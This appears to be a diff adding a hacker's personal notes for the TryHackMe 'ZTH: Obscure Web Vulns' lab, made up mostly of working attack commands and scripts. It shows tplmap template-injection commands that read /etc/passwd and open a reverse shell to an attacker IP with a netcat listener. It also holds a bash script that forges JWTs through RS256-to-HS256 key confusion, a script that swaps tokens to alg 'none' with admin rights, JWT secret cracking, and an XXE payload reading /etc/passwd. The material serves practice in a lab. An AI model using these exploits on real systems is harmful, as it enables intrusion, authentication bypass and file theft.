@@ -1,0 +1,146 @@
+Install tplmap
+wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
+sudo python2.7 get-pip.py
+python2 -m pip install --upgrade setuptools
+python2 -m pip install virtualenv 
+git clone https://github.com/epinna/tplmap.git
+cd ./tplmap/
+python2 -m virtualenv tplmap-venv
+source ./tplmap-venv/bin/activate
+(tplmap-venv) $ python2 -m pip install -r requirements.txt 
+
+python2 -m pip list
+
+tplmap -u http://10.10.48.75:5000 -d 'noot' --os-cmd "cat /etc/passwd"
+
+tplmap -u http://10.10.107.236 -d 'name' --reverse-shell 10.11.52.16 4444
+nc -lnvp 4444
+
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
+
+https://medium.com/secure-you/zth-obscure-web-vulns-c4e7c551acc0
+https://www.thedutchhacker.com/zth-obscure-web-vulns/
+https://octothorp88.medium.com/tryhackme-zth-obscure-web-vulns-52c3ffcd4ce9
+
+python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjQxMzUyMDY2LCJleHAiOjE2NDEzNTIxODYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.R5nlZdEy1iozCkMjZh1E7GtbtqeOf9bY49bmm0HDySZh40o5zt09cOG_Pv2J11NE-OUcOkhswmIvbjCEzB2hNJEX5qd7UFL7V-Bu6Z_NBodcNM51sESf10cKysSDGBRlRK1zYp9idW3XIyYqQJ531oM34L-df4xzUNfMmlDcuWd0aap8K_jFrfYymbJN4n5LHHkOmzgoZaxL1KZYVqT90C-KM_VvXWfVRpLDkDC9VagwJaqiSlzQrOkOFZX4vASxurIE60NmfxzCuZV8xMThiMgCFW3wI-v6ZOfLKvxt8qPVD9mdb8PddEWvltuOberp1HS4gBBJ_bRMm19XLzkNHA.yJlqIkhzTA7sOIX4GBQcyaG0Es0TdPxgNa33B1b4Oyc
+
+
+cat public.pem | xxd -p | tr -d "\\n"
+2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541716938546e75514247584f47782f4c666e344a460a4e594f4832563171656d6673383373745763315a4251464351415a6d55722f736762507970597a7932323970466c3662476571706952487253756648756737630a314c4379616c795545502b4f7a65716245685353755573732f5879667a79624975736271494445514a2b5965783343646777432f68414633787074562f32742b0a48367930476468317765564b524d382b5161655755784d474f677a4a59416c55635241503564526b454f5574534b4842464f466845774e425872664c643736660a5a58504e67794e30547a4e4c516a50514f792f744a2f5646713843514745342f4b35456c5253446c6a346b7377786f6e575859415556786e71524e314c4748770a32473551524532443133734b484343385a725a584a7a6a36374872713568325341444b7a567a684138415733575a6c504c726c46543374312b695a366d2b61460a4b774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
+
+echo -n 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjQxMzUyMDY2LCJleHAiOjE2NDEzNTIxODYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.R5nlZdEy1iozCkMjZh1E7GtbtqeOf9bY49bmm0HDySZh40o5zt09cOG_Pv2J11NE-OUcOkhswmIvbjCEzB2hNJEX5qd7UFL7V-Bu6Z_NBodcNM51sESf10cKysSDGBRlRK1zYp9idW3XIyYqQJ531oM34L-df4xzUNfMmlDcuWd0aap8K_jFrfYymbJN4n5LHHkOmzgoZaxL1KZYVqT90C-KM_VvXWfVRpLDkDC9VagwJaqiSlzQrOkOFZX4vASxurIE60NmfxzCuZV8xMThiMgCFW3wI-v6ZOfLKvxt8qPVD9mdb8PddEWvltuOberp1HS4gBBJ_bRMm19XLzkNHA' |
+openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541716938546e75514247584f47782f4c666e344a460a4e594f4832563171656d6673383373745763315a4251464351415a6d55722f736762507970597a7932323970466c3662476571706952487253756648756737630a314c4379616c795545502b4f7a65716245685353755573732f5879667a79624975736271494445514a2b5965783343646777432f68414633787074562f32742b0a48367930476468317765564b524d382b5161655755784d474f677a4a59416c55635241503564526b454f5574534b4842464f466845774e425872664c643736660a5a58504e67794e30547a4e4c516a50514f792f744a2f5646713843514745342f4b35456c5253446c6a346b7377786f6e575859415556786e71524e314c4748770a32473551524532443133734b484343385a725a584a7a6a36374872713568325341444b7a567a684138415733575a6c504c726c46543374312b695a366d2b61460a4b774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
+
+
+(stdin)= c8996a2248734c0eec3885f818141cc9a1b412cd1374fc6035adf70756f83b27
+
+python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('c8996a2248734c0eec3885f818141cc9a1b412cd1374fc6035adf70756f83b27')).replace('=','')\")"
+yJlqIkhzTA7sOIX4GBQcyaG0Es0TdPxgNa33B1b4Oyc
+
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQxMzY0NDQ4NDQ5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTEuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85MS4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDEzNjQ0NDh9.tSaOsUkaWGPzUB-srJgAp8t5Xov8qx-NrttYQXF_0Fs
+
+or create file .sh
+vi exploit.sh         
+#!/bin/bash
+
+# Update the IP to the IP of the vulnerable machine
+
+ip=10.10.168.101
+echo ""
+echo "TryHackMe ZTH: Obscure Web Vulns JWT Challenge"
+echo ""echo "[+] downloading public key "
+if [ -f public.pem ] ;then
+ echo "[i] Removing old Public Key"
+ rm public.pem
+fi
+wget --quiet http://$ip/public.pem &1>/dev/null
+
+echo "[+] Obtaining JWT file from http://$ip"
+curl -s http://$ip | grep -o ey.* >jwt
+
+part1=$(cat jwt | cut -f1 -d".")
+part2=$(cat jwt | cut -f2 -d".")
+part3=$(cat jwt | cut -f3 -d".")
+
+echo "[+] Changing Header from RS256 to HS256"
+
+newpart1=$(echo $part1 | base64 -d | sed 's/RS256/HS256/g' | base64)
+
+echo "[+] Converting public key to hex"
+
+cat public.pem | xxd -p | tr -d "\\n" >public.xxd
+publicxxd=$(cat public.xxd)
+
+echo "[+] Signing the JWT with the valid HS256 key"
+
+key=$(echo -n $newpart1.$part2 | openssl dgst -sha256 -mac HMAC -macopt hexkey:`cat public.xxd`| tr -d " " | cut -f2 -d "=")
+
+echo "[+] Decode the hex to binary and reencoded the data" 
+
+secret=$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('"$key"')).replace('=','')\")")
+
+echo ""
+echo "---Manual Submission--"
+echo $newpart1.$part2.$secret
+echo "----------------------"
+echo ""
+final=$newpart1.$part2.$secret
+
+echo "[+] Attempting submission via curl"
+
+curl -s -X POST -F "jwt=$final" http://$ip/rs256.php | sed 's/<.*>//g'
+
+# The sed 's/<.*>//g' at the last part of the curl command is to pull out all the HTML tags and display text.####
+###
+
+
+
+vi conver_base64.sh
+cat convert_base64.sh 
+#!/bin/bash
+
+if [ $# -eq 0 ] ; then
+ echo "USAGE: $0 JavaWebToken"
+ exit
+fi
+jwt=$1
+part1=$(echo -n $jwt | cut -f1 -d'.' | base64 -di | sed 's/HS256/none/g'| base64)
+part2=$(echo -n $jwt | cut -f2 -d'.' | base64 -di | sed 's/user/admin/g' | base64)
+echo ""
+echo $part1.$part2. | tr -d ' ='
+####
+
+./ex.sh eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQxMzY0NDQ4NDQ5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTEuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85MS4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDEzNjQ0NDh9.tSaOsUkaWGPzUB-srJgAp8t5Xov8qx-NrttYQXF_0Fs
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjQxMzY0NDQ4NDQ5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTEuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85MS4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjQxMzY0NDQ4fQ.
+
+F12 change Token
+
+
+
+./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE abcdefghijklmnopqrstuvwxyz 4
+Secret is "pass"
+
+
+https://octothorp88.medium.com/tryhackme-zth-obscure-web-vulns-52c3ffcd4ce9
+https://medium.com/secure-you/zth-obscure-web-vulns-c4e7c551acc0
+
+https://tryhackme.com/room/zthobscurewebvulns
+
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe
+
+Burp ---< repeater
+
+email: &xxe;
+
+add more 
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+
+
